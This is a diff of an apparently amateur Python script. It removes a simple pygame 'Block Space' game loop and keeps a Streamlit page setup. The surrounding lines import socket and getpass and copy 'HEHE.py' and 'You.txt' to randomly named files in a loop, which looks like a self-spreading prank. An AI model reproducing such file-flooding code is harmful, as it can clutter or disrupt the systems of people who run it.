@@ -1,4 +1,3 @@
-import pygame
 from sys import exit
 import socket
 import getpass
@@ -63,49 +62,6 @@ for i in range(Amount_Of_Tabs):
      shutil.copy("HEHE.py", randomName)
      shutil.copy("You.txt", randomName)
    
-
-Screen_Height = 1000
-Screen_Width = 500
-plr = pygame.Rect(50, 50, 50, 50)
-Launcher = pygame.Rect(50,100,30,700)
-
-pygame.init()
-screen = pygame.display.set_mode((Screen_Height, Screen_Width))
-pygame.display.set_caption("Block Space")
-clock = pygame.time.Clock
-
-run = True
-while run:
-
-    screen.fill((0,0,0))
-
-    pygame.draw.rect(screen, (250,0,0), plr)
-    pygame.draw.rect(screen, (100,0,0), Launcher)
-
-    Launcher.move_ip(1,0)
-
-    key = pygame.key.get_pressed()
-    if key[pygame.K_a]:
-     plr.move_ip(0.1, 0)
-    elif key[pygame.K_d]:
-        plr.move_ip(1, 0)
-    elif key[pygame.K_w]:
-        plr.move_ip(0, -1)
-    elif key[pygame.K_s]:
-        plr.move_ip(0, 1)
-
-    for event in pygame.event.get():
-        if event.type == pygame.QUIT:
-            run = False
-       
-    pygame.display.update()  
-
-pygame.quit()
-
-print("Game over")
-
-
-
 st.set_page_config(page_title="Block_Space.com", page_icon=":smiley:", layout="wide")
 
 with st.container():
